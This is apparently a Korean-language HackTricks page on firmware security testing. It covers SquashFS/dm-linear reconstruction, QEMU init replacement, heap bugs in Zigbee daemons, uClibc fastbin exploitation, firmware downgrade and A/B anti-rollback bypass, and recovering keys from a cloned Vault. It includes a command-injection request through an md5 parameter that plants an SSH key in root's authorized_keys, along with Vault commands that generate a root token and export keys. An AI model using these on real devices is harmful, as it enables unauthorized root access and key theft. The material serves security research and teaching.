SquashFS superblock은 읽을 수 있지만 inode, 디렉터리 또는 fragment-table 오프셋이 올바르지 않다면 `unsquashfs`를 바로 수정하지 마세요. 초기 부팅 바이너리를 역분석하고 해당 바이너리가 구성하는 블록 장치 그래프를 재현하세요. 임베디드 시스템은 명목상 루트 파티션을 노출하면서도 다른 파티션에서 가져온 섹터를 덧붙이는 `dm-linear` 매핑으로 실제 파일시스템을 구성할 수 있습니다. superblock만 검사하면 이후의 모든 메타데이터 블록 위치가 어긋나 있어도 성공할 수 있습니다.<sup>[[11]](#references)</sup>

펌웨어의 산술 연산을 정확히 유지하세요. 특히 길이가 바이트, 512바이트 섹터 또는 4 KiB 페이지 중 무엇인지 식별하고, 시프트와 절삭을 원래 순서대로 재현하며, A/B 레이아웃의 뱅크별 후미 영역을 고려하세요. 예를 들어 `(partition_bytes >> 12) << 3`은 먼저 4 KiB 경계로 절삭한 다음 결과를 512바이트 섹터 단위로 표현합니다. 이를 `partition_bytes // 512`로 바꾸면 덧붙인 영역의 위치가 몇 킬로바이트 정도 이동해 뒤따르는 모든 SquashFS 테이블이 손상될 수 있습니다.<sup>[[11]](#references)</sup>

유용한 검증 워크플로는 다음과 같습니다.<sup>[[11]](#references)</sup>

1. 검증기/init 바이너리에서 각 `dm-linear` 세그먼트의 소스 장치, 시작 섹터 및 길이를 복원합니다.
2. 정렬 의미를 바꾸지 않고 영역을 연결하거나 매핑합니다.
3. 추출에 계속 실패하면 예측 경계 주변의 작은 범위만 검색하고, 그럴듯한 superblock 하나만으로 판단하지 말고 연속된 여러 유효 메타데이터 구조가 있는지 확인합니다.
4. 재구성된 이미지를 수정하지 않은 `unsquashfs`로 실행합니다. `unsquashfs -stat`보다 모든 디렉터리와 fragment를 성공적으로 순회하는 것이 더 강력한 증거입니다.

#### 분석가가 제어하는 dm-verity 대체

분석가가 QEMU 커널, initramfs 및 가상 디스크를 제어하는 경우, 벤더의 검증용 PID 1을 작고 정적으로 링크된 init으로 대체해 수정된 루트를 부팅할 수 있습니다. 이는 **실험실 환경에서의 부팅 체인 대체**이며, dm-verity, RSA 서명, Secure Boot 또는 TPM에 봉인된 키를 깨는 것이 아닙니다.<sup>[[11]](#references)</sup>

대체 init은 원래 부팅 경로의 작동 부분을 그대로 따라야 합니다. `devtmpfs`를 마운트하고, `setsid()`를 호출하고, `/dev/console`을 파일 디스크립터 0–2에 연결하고, `/proc`과 `/sys`를 마운트하고, 제공된 블록 장치가 준비될 때까지 기다린 다음, 편집한 루트를 읽기 전용으로 마운트하고, 기존 루트의 의사 파일시스템을 분리하고, 새 마운트를 `/`로 이동하고, `chroot`한 뒤 펌웨어의 원래 `/sbin/init`을 `execve()`로 실행합니다. `MS_MOVE` **전에** `/dev`, `/proc`, `/sys`를 분리하면 새 루트에 속한 마운트 지점을 실수로 분리하는 일을 방지할 수 있습니다.<sup>[[11]](#references)</sup>

변경 가능한 장치 상태는 수정한 불변 루트와 분리해 두세요. qcow2 오버레이로 원본 디스크의 LVM 상태를 유지하면서, 두 번째 읽기 전용 virtio 디스크로 편집된 SquashFS를 제공할 수 있습니다.<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 오프라인 이미지 상태 디버깅

느린 부팅, 파괴적인 시작 스크립트 또는 신뢰할 수 없는 콘솔 로깅으로 인해 실패 원인이 불분명할 때는 게스트 외부에서 영구 상태를 검사하세요. 실행 중인 VM에서 사용 중인 overlay는 절대 연결하지 마세요. `qemu-nbd`로 노출하고, LVM 검색 범위를 의도한 NBD 파티션으로 제한한 다음, 연결을 해제하기 전에 볼륨 그룹을 비활성화하세요.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

반복 가능한 fault isolation을 위해 안정적으로 쓰기 가능한 볼륨에 타임스탬프가 포함된 마커 파일을 기록하고 오프라인에서 확인하세요. `/dev/kmsg`, FIFO, 일시적인 콘솔은 rate limiting이나 프로세스의 조기 종료로 인해 false negative를 만들 수 있습니다. 또한 관련 없는 코드를 변경하기 전에 각 계층의 인터페이스가 정확히 일치하는지 비교하세요. 예를 들어 `uname -r`과 `/lib/modules/`, 디스크에 기록된 ext4 기능과 커널 설정, Mesa `libGL` 세대와 DRI driver ABI, PCI 정보에서 파생된 드라이버 이름을 비교합니다. 구성 요소가 존재하고 `dlopen()`에 성공하더라도, 이를 사용하는 쪽이 다른 ABI를 기대하면 사용할 수 없는 상태일 수 있습니다.<sup>[[11]](#references)</sup>

## 실제 환경에서의 동적 분석

이 단계에서는 실제 또는 에뮬레이션된 디바이스 환경을 분석에 사용합니다. OS와 파일 시스템에 대한 shell access를 유지하는 것이 중요합니다. 에뮬레이션이 하드웨어 상호작용을 완벽하게 모방하지 못할 수 있으므로, 에뮬레이션을 간헐적으로 다시 시작해야 할 수 있습니다. 분석 과정에서는 파일 시스템을 다시 살펴보고, 노출된 웹페이지와 네트워크 서비스를 악용하며, bootloader 취약점을 탐색해야 합니다. 잠재적인 backdoor 취약점을 식별하려면 펌웨어 무결성 테스트가 중요합니다.

## 런타임 분석 기법

런타임 분석은 gdb-multiarch, Frida, Ghidra와 같은 도구를 사용해 운영 환경에서 프로세스나 바이너리와 상호작용하는 방식입니다. 이러한 도구로 breakpoint를 설정하고 fuzzing 등의 기법을 통해 취약점을 식별합니다.

완전한 debugger가 없는 임베디드 대상에서는 **정적으로 링크된 `gdbserver`를 디바이스에 복사하고 원격으로 연결하세요**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 메시지 매핑

IoT 허브에서는 RF 스택이 **radio MCU**와 Linux userland 프로세스 사이에 분리되는 경우가 많습니다. 유용한 작업 흐름은 다음 경로를 매핑하는 것입니다:<sup>[[8]](#references)</sup>

1. 무선상의 **RF frame**
2. radio MCU의 **controller-side parser**
3. Linux로 전달되는 **serial/UART text 또는 TLV protocol**(예: `/dev/tty*`)
4. 메인 daemon의 **application dispatcher**
5. **protocol-specific handler / state machine**

이 아키텍처에서는 리버싱 대상이 하나가 아니라 두 개가 됩니다. 컨트롤러가 바이너리 radio frame을 `Group,Command,arg1,arg2,...` 같은 텍스트 프로토콜로 변환한다면 다음을 파악합니다.

- **message group**과 dispatch table
- 네트워크에서 올 수 있는 메시지와 컨트롤러 자체에서 오는 메시지
- 정확한 **manufacturer-specific discriminator field**(예: Zigbee `manufacturer_code`와 사용자 지정 `cluster_command`)
- **commissioning**, discovery 또는 firmware/model download 단계에서만 도달 가능한 handler

Zigbee의 경우 pairing 트래픽을 캡처하고 대상이 여전히 기본 **Link Key**인 `ZigBeeAlliance09`에 의존하는지 확인합니다. 그렇다면 commissioning 트래픽을 스니핑해 **Network Key**를 노출할 수 있습니다. Zigbee 3.0 install code는 이러한 노출을 줄이므로, 테스트한 장치가 실제로 이를 강제하는지 기록합니다.

### Manufacturer-specific protocol handler와 FSM으로 제어되는 도달 가능성

Vendor-specific Zigbee/ZCL command는 표준 cluster보다 더 나은 공격 대상인 경우가 많습니다. 충분히 검증되지 않은 **custom parsing code**와 내부 **FSM**으로 이어지기 때문입니다.<sup>[[8]](#references)</sup>

실용적인 작업 흐름:

- command dispatcher를 리버스 엔지니어링해 **vendor-only handler**를 찾습니다.
- **FSM state**, **event**, **check**, **action**, **next-state** table을 파악합니다.
- 자동으로 다음 단계로 넘어가는 **transitional state**와 attacker-controlled state를 결국 초기화하거나 해제하는 retry/error branch를 식별합니다.
- 버그가 있는 handler에 항상 도달할 수 있다고 가정하지 말고, daemon을 취약한 state로 전환하는 데 필요한 정상적인 protocol exchange를 확인합니다.

타이밍에 민감한 protocol에서는 Python framework를 이용한 packet replay가 너무 느릴 수 있습니다. 더 안정적인 방법은 vendor-grade stack을 사용해 실제 하드웨어(예: **nRF52840**)에서 정상 장치를 에뮬레이션하여 올바른 **endpoint**, **attribute**, commissioning 타이밍을 재현하는 것입니다.

### 임베디드 daemon의 fragmented-download 버그 유형

임베디드 firmware에서 **fragmented blob/model/configuration download**와 관련한 버그가 반복적으로 나타납니다.<sup>[[8]](#references)</sup>

1. **첫 번째 fragment**(`offset == 0`)가 `ctx->total_size`를 저장하고 `malloc(total_size)`을 할당합니다.
2. 이후 fragment는 `packet_total_size >= offset + chunk_len` 같은 attacker-controlled **packet-local** 필드만 검증합니다.
3. 복사 과정에서 **원래 할당된 크기**와 비교하지 않고 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`을 사용합니다.

이를 통해 공격자는 다음을 전송할 수 있습니다.

- 작은 heap 할당을 유도하도록 선언된 전체 크기가 **작은** 유효한 첫 fragment
- **예상 offset**은 유지하면서 더 큰 `chunk_len`을 지정한 후속 fragment
- 새 검증은 통과하면서 원래 할당된 buffer를 여전히 overflow시키는 위조된 packet-local 크기

취약한 경로가 commissioning 로직 뒤에 있다면, 잘못된 fragment를 전송하기 전에 대상이 예상된 model-download 또는 blob-download state로 진입하도록 충분한 **device emulation**을 포함해야 합니다.

### Protocol-driven `free()` 트리거

임베디드 daemon에서 heap metadata exploitation을 유발하는 가장 쉬운 방법은 흔히 "정리될 때까지 기다리는 것"이 아니라 **protocol 자체의 오류 처리 로직을 강제로 실행하는 것**입니다.<sup>[[8]](#references)</sup>

- 잘못된 후속 fragment를 보내 FSM을 **retry** 또는 **error** state로 전환합니다.
- 재시도 임계값을 초과시켜 daemon이 **context를 초기화**하고 손상된 buffer를 해제하도록 합니다.
- 예측 가능한 `free()`를 이용해 프로세스가 다른 이유로 crash하기 전에 allocator-side primitive를 트리거합니다.

이는 특히 임베디드 Linux의 **musl/uClibc/dlmalloc 계열** allocator를 대상으로 할 때 유용합니다. chunk metadata를 손상시키면 unlink/unbin 로직을 write primitive로 바꿀 수 있습니다. 안정적인 패턴은 실제 bin pointer를 즉시 덮어써 프로세스를 crash시키는 대신, **size field**를 손상시켜 allocator traversal이 overflow된 buffer 내부에 배치한 **fake chunk**로 향하도록 하는 것입니다.

## Binary Exploitation 및 Proof-of-Concept

식별된 취약점에 대한 PoC를 개발하려면 대상 아키텍처를 깊이 이해하고 low-level 언어로 프로그래밍해야 합니다. 임베디드 시스템에서는 binary runtime protection이 드물지만, 존재하는 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

### uClibc fastbin exploitation 참고 사항 (embedded Linux)

- **Fastbin과 consolidation:** uClibc는 glibc와 유사한 fastbin을 사용합니다. 이후의 큰 할당이 `__malloc_consolidate()`를 트리거할 수 있으므로 fake chunk는 검사를 통과해야 합니다(적절한 크기, `fd = 0`, 주변 chunk가 "사용 중"으로 인식될 것).<sup>[[6]](#references)</sup>
- **ASLR이 적용된 non-PIE binary:** ASLR이 활성화되어 있지만 메인 binary가 **non-PIE**라면 binary 내부의 `.data/.bss` 주소는 안정적입니다. 유효한 heap chunk header와 이미 유사한 영역을 대상으로 하여 fastbin 할당이 **function pointer table**에 도달하게 할 수 있습니다.
- **Parser를 중단시키는 NUL:** JSON을 파싱할 때 payload의 `\x00`은 파싱을 중단시키면서 뒤에 남은 attacker-controlled byte는 stack pivot/ROP chain용으로 유지할 수 있습니다.
- **`/proc/self/mem`을 통한 shellcode:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain으로 알려진 mapping에 실행 가능한 shellcode를 배치한 다음 해당 위치로 jump할 수 있습니다.

## Firmware Analysis용 사전 구성 운영 체제

[AttifyOS](https://github.com/adi0x90/attifyos)와 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 운영 체제는 firmware 보안 테스트에 필요한 도구를 갖춘 사전 구성 환경을 제공합니다.

## Firmware 분석용 사전 구성 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) 장치의 보안 평가와 penetration testing을 지원하도록 설계된 배포판입니다. 필요한 모든 도구가 탑재된 사전 구성 환경을 제공해 시간을 크게 절약할 수 있습니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware 보안 테스트 도구가 사전 설치된 Ubuntu 18.04 기반 임베디드 보안 테스트 운영 체제입니다.

## Firmware Downgrade 공격 및 안전하지 않은 Update 메커니즘

vendor가 firmware image의 암호화 서명 검사를 구현하더라도 **version rollback (downgrade) protection은 자주 누락됩니다**. boot- 또는 recovery-loader가 내장된 공개 키로 서명만 검증하고 플래시할 image의 *version*(또는 단조 증가 counter)은 비교하지 않는다면, 공격자는 서명이 유효한 **이전의 취약한 firmware를 합법적으로 설치**해 이미 패치된 취약점을 다시 노출시킬 수 있습니다.<sup>[[4]](#references)</sup>

일반적인 공격 흐름:

1. **이전 버전의 서명된 image를 확보합니다.**
   * vendor의 공개 download portal, CDN 또는 지원 사이트에서 가져옵니다.
   * 관련 모바일/데스크톱 애플리케이션에서 추출합니다(예: Android APK의 `assets/firmware/`).
   * VirusTotal, Internet archive, forum 등의 제3자 repository에서 가져옵니다.
2. 노출된 update channel을 통해 image를 장치에 **업로드하거나 제공합니다.**
   * Web UI, 모바일 앱 API, USB, TFTP, MQTT 등
   * 많은 consumer IoT 장치에는 인증 없이 접근할 수 있는 HTTP(S) endpoint가 있어 Base64로 인코딩된 firmware blob을 받고, 서버 측에서 디코딩한 후 recovery/upgrade를 실행합니다.
3. downgrade 후 최신 release에서 패치된 취약점을 악용합니다(예: 이후 버전에 추가된 command-injection filter).
4. 선택적으로, persistence를 확보한 후 탐지를 피하기 위해 최신 image를 다시 플래시하거나 update를 비활성화합니다.

### 예시: Downgrade 후 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

취약한(다운그레이드된) firmware에서는 `md5` 매개변수가 정화 과정 없이 셸 명령에 직접 연결되어 임의의 명령을 삽입할 수 있습니다(여기서는 SSH 키 기반 root 액세스를 활성화함). 이후 firmware 버전에서는 기본적인 문자 필터를 도입했지만, downgrade protection이 없어 수정 사항은 무용지물입니다.<sup>[[4]](#references)</sup>

### 모바일 앱에서 Firmware 추출하기

많은 공급업체는 앱이 Bluetooth/Wi-Fi를 통해 장치를 업데이트할 수 있도록 전체 firmware 이미지를 함께 제공하는 모바일 앱에 포함합니다. 이러한 패키지는 일반적으로 `assets/fw/` 또는 `res/raw/`와 같은 경로의 APK/APEX에 암호화되지 않은 상태로 저장됩니다. `apktool`, `ghidra` 같은 도구나 간단한 `unzip`만으로도 실제 하드웨어에 손대지 않고 서명된 이미지를 추출할 수 있습니다.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B 슬롯 설계에서 updater만 대상으로 하는 anti-rollback 우회

일부 벤더는 anti-downgrade **ratchet**을 구현하지만, *updater* 로직 내부에서만 적용합니다(예: CAN을 통한 UDS 루틴, recovery 명령 또는 userspace OTA agent). 이후 **bootloader**가 이미지 서명/CRC만 확인하고 파티션 테이블이나 슬롯 메타데이터를 신뢰한다면, 롤백 보호를 여전히 우회할 수 있습니다.<sup>[[7]](#references)</sup>

일반적인 취약 설계:

- 펌웨어 메타데이터에 버전 설명자와 **security ratchet** / monotonic counter가 모두 포함됩니다.
- updater는 이미지 ratchet을 persistent storage에 저장된 값과 비교해, 더 오래된 서명된 이미지를 거부합니다.
- bootloader는 해당 ratchet을 **파싱하지 않고**, 부팅 전에 선택된 슬롯의 헤더, CRC, 서명만 검증합니다.
- 슬롯 활성화 상태는 파티션 테이블이나 슬롯별 generation counter에 별도로 저장되며, 검증된 정확한 펌웨어 digest와 **암호학적으로 연결되어 있지 않습니다**.

이로 인해 듀얼 슬롯 시스템에서 **이미지 하나를 검증하고 다른 이미지를 부팅하는** primitive가 생깁니다. 공격자가 updater로 하여금 최신 서명된 이미지를 사용해 슬롯 B를 다음 부팅 대상으로 지정하게 한 뒤, 재부팅 전에 슬롯 B를 덮어쓸 수 있다면, bootloader는 이미 커밋된 슬롯 메타데이터만 신뢰하므로 다운그레이드된 이미지를 부팅할 수 있습니다.

일반적인 악용 패턴:

1. **최신 서명된** 펌웨어를 비활성 슬롯에 업로드하고 일반 검증/전환 루틴을 실행해, 레이아웃에서 해당 슬롯을 다음 활성 슬롯으로 지정하게 합니다.
2. **아직 재부팅하지 않습니다**. 같은 세션에서 슬롯 준비/삭제 루틴에 다시 진입합니다.
3. 오래된 부팅 상태 또는 슬롯 선택 로직을 악용해 updater가 방금 승격한 **동일한 물리 슬롯**을 삭제하게 합니다.
4. 더 오래되었지만 여전히 서명된 펌웨어를 해당 슬롯에 기록합니다.
5. ratchet을 적용하는 검증 루틴을 건너뛰고 바로 재부팅합니다.
6. bootloader는 승격된 슬롯을 선택하고 서명/무결성만 확인한 뒤 이전 이미지를 부팅합니다.

A/B 업데이트 구현을 리버스 엔지니어링할 때 확인할 사항:

- 슬롯 선택이 성공적인 전환 후 갱신되지 않는 **부팅 시점 플래그**에서 결정되는지 여부.
- `prepare_passive_slot()` 형태의 루틴이 **현재 커밋된 레이아웃**이 아닌 오래된 상태를 바탕으로 슬롯을 삭제하는지 여부.
- `part_write_layout()` 형태의 함수가 검증된 이미지 hash를 저장하지 않고 **generation counter** / 활성 플래그만 변경하는지 여부.
- ratchet 검사가 userspace 또는 updater 코드에 구현되어 있지만 ROM / bootloader / secure boot 단계에는 없는지 여부.
- 삭제 또는 복구 루틴이 슬롯의 콘텐츠를 삭제하고 다시 기록한 뒤에도 해당 슬롯을 부팅 가능한 상태로 남겨 두는지 여부.

### 업데이트 로직 평가 체크리스트

* *update endpoint*의 전송/인증이 적절히 보호되는가(TLS + 인증)?
* 플래싱 전에 기기가 **버전 번호** 또는 **monotonic anti-rollback counter**를 비교하는가?
* 이미지가 secure boot chain 내부에서 검증되는가(예: ROM 코드에서 서명을 확인)?
* **bootloader가 updater와 동일한 ratchet을 적용하는가**, 아니면 서명/CRC만 확인하는가?
* 슬롯 활성화 메타데이터가 **검증된 펌웨어 digest/version과 연결되어 있는가**, 아니면 승격 후에도 슬롯을 수정할 수 있는가?
* 슬롯 전환이 성공한 뒤 기기가 반드시 재부팅되는가, 아니면 같은 세션에서 후속 업데이트/삭제 루틴을 계속 실행할 수 있는가?
* userland 코드가 추가적인 유효성 검사를 수행하는가(예: 허용된 파티션 맵, 모델 번호)?
* *부분* 또는 *백업* 업데이트 흐름에서도 동일한 검증 로직을 재사용하는가?

> 💡  위 항목 중 하나라도 빠져 있다면, 해당 플랫폼은 롤백 공격에 취약할 가능성이 높습니다.

## 실습용 취약 펌웨어

펌웨어 취약점 발견을 연습하려면 다음 취약 펌웨어 프로젝트를 시작점으로 사용하세요.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 임베디드 KMS/Vault 상태에서 펌웨어 복호화 키 복구

업데이트 이미지에 작은 평문 메타데이터와 크기가 크고 엔트로피가 높은 blob이 섞여 있다면, 무차별 대입을 시도하기 전에 컨테이너를 먼저 분류하세요:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d`, `binwalk -E`를 사용해 헤더, 오프셋, 줄 경계를 덤프합니다.
- `Salted__`는 보통 OpenSSL `enc` 형식을 의미합니다. 다음 8바이트는 salt이며, 나머지 바이트는 ciphertext입니다.
- 디코딩 결과가 정확히 `256`바이트인 Base64 필드는 RSA-2048 ciphertext로 임의의 펌웨어 비밀번호/세션 키를 감싸고 있을 가능성이 높다는 강한 단서입니다.
- 같은 파일에 분리된 PGP 자료가 있다면 인증만 보호하는 경우가 많습니다. 이를 기밀성 보호 방식이라고 단정하지 마세요.

정적 키 검색(`grep`, `strings`, PEM/PGP 검색)이 실패한다면, private key만 계속 검색하지 말고 **실제 복호화 경로**를 리버스 엔지니어링하세요.

- updater / management 바이너리를 디컴파일하고, 암호화된 blob을 읽는 코드와 이를 해제하는 helper/API, 요청하는 논리적 키 이름을 추적합니다.
- 추출한 root filesystem에서 KMS 상태(`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`)와 unit 파일 및 init 스크립트를 검색합니다.
- 평문 `vault operator unseal ...`, recovery key, bootstrap token 또는 로컬 KMS auto-unseal 스크립트는 private key 자료와 동등하게 취급합니다.

기기에 원본 Vault 바이너리와 storage backend가 포함되어 있다면, Vault 내부를 다시 구현하는 것보다 해당 환경을 재현하는 편이 대개 더 쉽습니다:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

클론된 KMS에서 root 권한으로 다음을 수행합니다.

- 격리된 클론에서만 transit 키를 exportable로 설정합니다: `vault write transit/keys/<name>/config exportable=true`
- unwrap 키를 내보냅니다: `vault read transit/export/encryption-key/<name>`
- 복구한 RSA 키에 KMS에서 사용한 정확한 padding/hash 조합을 적용해 봅니다. PKCS#1 v1.5 복호화 실패와 기본 OAEP 복호화 실패만으로는 키가 잘못되었다고 단정할 수 없습니다. Vault 기반 흐름에서는 OAEP와 SHA-256을 사용하는 경우가 많지만, 일반적인 라이브러리는 기본값으로 SHA-1을 사용합니다.
- 페이로드가 `Salted__`로 시작한다면, AES-CBC 복호화를 시도하기 전에 벤더의 OpenSSL KDF(`EVP_BytesToKey`, 레거시 장비에서는 흔히 MD5)를 정확히 재현합니다.

이렇게 하면 "암호화된 펌웨어" 문제를 더 일반적인 문제로 바꿀 수 있습니다. **장비 측 operational key를 복구한 다음, 정확한 unwrap 및 KDF 매개변수를 오프라인에서 재현합니다.**

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude로 펌웨어 크래킹하기: 시니어 수준의 기술, 주니어 수준의 자율성](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [펌웨어 보안 테스트 방법론](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [실전 IoT 해킹: 사물 인터넷 공격을 위한 결정적 가이드](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [방치된 하드웨어의 제로데이 취약점 악용 – Trail of Bits 블로그](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20달러짜리 스마트 기기로 여러분의 집에 접근한 방법](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [이제 mi가 보인다: 이제 당신은 Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 충전 포트 커넥터를 통한 Tesla Wall Connector 악용 - 2부: anti-downgrade 우회](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [깜빡이게 만들기: Philips Hue Bridge의 Over-the-Air 악용](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU에서 Tesla OS ROOT하기 1부: 압축 해제](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux 커널 문서 - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU에서 Tesla OS ROOT하기 2부: 디버깅 및 수정](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS 암호: 취약한 XOR 암호화를 통해 SPI Flash에서 복구 가능 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS 암호 복구 도구](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — 하드웨어 해킹 복습 2부](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Cypherock 하드웨어 지갑을 해킹한 방법과 이유: 전체 이야기](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
